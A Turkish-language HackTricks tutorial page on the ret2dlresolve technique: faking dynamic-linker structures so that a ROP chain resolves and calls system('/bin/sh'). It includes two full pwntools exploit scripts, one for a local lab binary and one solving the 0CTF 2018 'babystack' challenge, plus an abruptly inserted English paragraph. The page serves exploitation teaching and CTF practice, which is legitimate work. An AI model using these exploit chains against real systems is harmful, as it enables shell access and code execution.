# Ret2dlresolve

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek destek olun.

</details>

## Temel Bilgiler

[**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md) ve [**Relro**](../common-binary-protections-and-bypasses/relro.md) sayfasında açıklandığı gibi, Full Relro olmayan ikili dosyalar, dış kütüphanelere adresler gibi sembolleri ilk kullandıklarında çözerler. Bu çözümleme, **`_dl_runtime_resolve`** işlevini çağırarak gerçekleşir.

**`_dl_runtime_resolve`** işlevi, belirtilen sembolü **çözmek** için gereken bazı yapıların referanslarını yığından alır.

Bu nedenle, istenen sembolü (örneğin **`system`** işlevi) çözmek ve yapılandırılmış bir parametre ile çağırmak için **tüm bu yapıların sahte oluşturulması mümkündür** (örneğin **`system('/bin/sh')`**).

Genellikle, tüm bu yapılar, yazılabilir bir bellek üzerinde **`read`** çağrısı yaparak başlangıç ROP zinciri oluşturularak sahte edilir, ardından yapılar ve dize **`'/bin/sh'`** okunarak bilinen bir konumda depolanır ve ardından ROP zinciri, **`_dl_runtime_resolve`**'ı çağırarak devam eder, sahte yapılar içinde **`system`** adresini çözerek ve bu adresi **`'/bin/sh'`** adresi ile çağırarak.

{% hint style="success" %}
Bu teknik özellikle sistem çağrı cihazlarının olmadığı durumlarda (örneğin [**ret2syscall**](rop-syscall-execv/) veya [SROP](srop-sigreturn-oriented-programming/) gibi teknikleri kullanmak için) ve libc adreslerini sızdırmak için yollar olmadığında kullanışlıdır.
{% endhint %}

Bu tekniğe ilişkin daha iyi bir açıklamayı aşağıdaki videonun ikinci yarısında bulabilirsiniz:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Yapılar

**`JMPREL`**, **`STRTAB`** ve **`SYMTAB`** olmak üzere 3 yapıyı sahte oluşturmak gereklidir. Bu yapıların nasıl oluşturulduğu hakkında daha iyi bir açıklamayı [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures) adresinde bulabilirsiniz.

## Saldırı Özeti

1. Sahte yapıları bir yere yazın
2. System'ın ilk argümanını ayarlayın (`$rdi = &'/bin/sh'`)
3. Yığında yapıları çağırmak için adresleri ayarlayın **`_dl_runtime_resolve`**
4. **`_dl_runtime_resolve`**'ı **çağırın**
5. **`system`**, `'/bin/sh'` argümanı ile çözülecek ve çağrılacaktır

## Örnek

### Saf Pwntools

Bu tekniğin [**örneğini burada bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) **son ROP zincirinin çok iyi bir açıklamasını içerir**, ancak burada kullanılan son saldırı şu şekildedir:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
### Ham

--- 

#### Dynamic Linker Resolver

Dynamic Linker Resolver (DL Resolver) is a technique used to resolve functions from shared libraries at runtime. This technique can be used in Return-Oriented Programming (ROP) to call functions from shared libraries without directly calling them. The DL Resolver can be used to bypass address space layout randomization (ASLR) and execute arbitrary code by resolving and calling functions from shared libraries.
```python
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/0ctf18_babystack/index.html
# This exploit is based off of: https://github.com/sajjadium/ctf-writeups/tree/master/0CTFQuals/2018/babystack

from pwn import *

target = process('./babystack')
#gdb.attach(target)

elf = ELF('babystack')

# Establish starts of various sections
bss = 0x804a020

dynstr = 0x804822c

dynsym = 0x80481cc

relplt = 0x80482b0

# Establish two functions

scanInput = p32(0x804843b)
resolve = p32(0x80482f0) #dlresolve address

# Establish size of second payload

payload1_size = 43

# Our first scan
# This will call read to scan in our fake entries into the plt
# Then return back to scanInput to re-exploit the bug

payload0 = ""

payload0 += "0"*44                        # Filler from start of input to return address
payload0 += p32(elf.symbols['read'])    # Return read
payload0 += scanInput                    # After the read call, return to scan input
payload0 += p32(0)                        # Read via stdin
payload0 += p32(bss)                    # Scan into the start of the bss
payload0 += p32(payload1_size)            # How much data to scan in

target.send(payload0)

# Our second scan
# This will be scanned into the start of the bss
# It will contain the fake entries for our ret_2_dl_resolve attack

# Calculate the r_info value
# It will provide an index to our dynsym entry
dynsym_offset = ((bss + 0xc) - dynsym) / 0x10
r_info = (dynsym_offset << 8) | 0x7

# Calculate the offset from the start of dynstr section to our dynstr entry
dynstr_index = (bss + 28) - dynstr

paylaod1 = ""

# Our .rel.plt entry
paylaod1 += p32(elf.got['alarm'])
paylaod1 += p32(r_info)

# Empty
paylaod1 += p32(0x0)

# Our dynsm entry
paylaod1 += p32(dynstr_index)
paylaod1 += p32(0xde)*3

# Our dynstr entry
paylaod1 += "system\x00"

# Store "/bin/sh" here so we can have a pointer ot it
paylaod1 += "/bin/sh\x00"

target.send(paylaod1)

# Our third scan, which will execute the ret_2_dl_resolve
# This will just call 0x80482f0, which is responsible for calling the functions for resolving
# We will pass it the `.rel.plt` index for our fake entry
# As well as the arguments for system

# Calculate address of "/bin/sh"
binsh_bss_address = bss + 35

# Calculate the .rel.plt offset
ret_plt_offset = bss - relplt


paylaod2 = ""

paylaod2 += "0"*44
paylaod2 += resolve                 # 0x80482f0
paylaod2 += p32(ret_plt_offset)        # .rel.plt offset
paylaod2 += p32(0xdeadbeef)            # The next return address after 0x80482f0, really doesn't matter for us
paylaod2 += p32(binsh_bss_address)    # Our argument, address of "/bin/sh"

target.send(paylaod2)

# Enjoy the shell!
target.interactive()
```
## Diğer Örnekler ve Referanslar

* [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)
* [https://guyinatuxedo.github.io/18-ret2\_csu\_dl/0ctf18\_babystack/index.html](https://guyinatuxedo.github.io/18-ret2\_csu\_dl/0ctf18\_babystack/index.html)
* 32 bit, relro olmayan, canary olmayan, nx, pie olmayan, temel küçük buffer overflow ve return. Sömürmek için bof, `read`'i tekrar çağırmak için kullanılır, `.bss` bölümü ve daha büyük bir boyutta, `dlresolve` sahte tabloları yüklemek için `system`'i yüklemek için ana dönüş ve başlangıçtaki bof'u tekrar kötüye kullanmak için dlresolve'u çağırmak ve ardından `system('/bin/sh')`'i çağırmak için kullanılır.
